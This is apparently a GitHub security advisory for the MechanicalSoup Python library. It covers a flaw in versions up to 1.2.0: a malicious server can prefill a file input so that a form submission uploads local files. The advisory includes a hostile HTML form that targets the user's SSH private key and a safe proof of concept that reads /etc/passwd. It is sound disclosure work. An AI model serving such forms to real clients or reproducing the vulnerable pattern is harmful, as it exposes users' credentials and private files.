# Malicious web server can read arbitrary files on client using file input inside HTML form

Moderate

[hemberger](/hemberger)
published
GHSA-x456-3ccm-m6j4
Jul 4, 2023

## Package

pip

MechanicalSoup
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<=1.2.0, >=0.2.0

## Patched versions

>=1.3.0

## Description

### Summary

A malicious web server can read arbitrary files on the client using a `<input type="file" ...>` inside HTML form.

### Details

This affects the extremely common pattern of form submission:

```
b = mechanicalsoup.StatefulBrowser()
b.select_form(...)
b.submit_selected()
```

The problem is with the code in `browser.Browser.get_request_kwargs`:

```
    if tag.get("type", "").lower() == "file" and multipart:
        filepath = value
        if filepath != "" and isinstance(filepath, str):
            content = open(filepath, "rb")
        else:
            content = ""
        filename = os.path.basename(filepath)
        # If value is the empty string, we still pass it
        # for consistency with browsers (see
        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
        files[name] = (filename, content)
```

The file path is taken from the bs4 tag "value" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:

```
<html><body>
  <form method="post" enctype="multipart/form-data">
    <input type="text" name="greeting" value="hello" />
    <input type="file" name="evil" value="/home/user/.ssh/id_rsa" />
  </form>
</body></html>
```

then upon `.submit_selected()` the mechanicalsoup browser will happily send over the contents of your SSH private key.

### PoC

```
import attr
import mechanicalsoup
import requests

class NevermindError(Exception):
    pass

@attr.s
class FakeSession:
    session = attr.ib()

    headers = property(lambda self: self.session.headers)

    def request(self, *args, **kwargs):
        print("requested", args, kwargs)
        raise NevermindError  # don't actually send request

def demonstrate(inputs=None):
    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))
    b.open_fake_page("""\
<html><body>
<form method="post" enctype="multipart/form-data">
<input type="text" name="greeting" value="hello" />
<input type="file" name="evil" value="/etc/passwd" />
<input type="file" name="second" />
</form>
</body></html>
""", url="http://127.0.0.1:9/")
    b.select_form()
    if inputs is not None:
        b.form.set_input(inputs)
    try:
        b.submit_selected()
    except NevermindError:
        pass

# %%

# unpatched
demonstrate()
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', <_io.BufferedReader name='/etc/passwd'>), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}

# %%

# with the patch, this now works. users MUST open the file manually and
# use browser.set_input() using the file object.
demonstrate({"greeting": "hiya", "evil": open("/etc/hostname", "rb").name, "second": open("/dev/null", "rb")})
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', <_io.BufferedReader name='/etc/hostname'>), 'second': ('null', <_io.BufferedReader name='/dev/null'>)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}

# %%

# with the patch, this raises a ValueError with a helpful string
demonstrate({"evil": "/etc/hostname"})

# %%

# with the patch, we silently send no file if a malicious server tries the attack:
demonstrate()

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
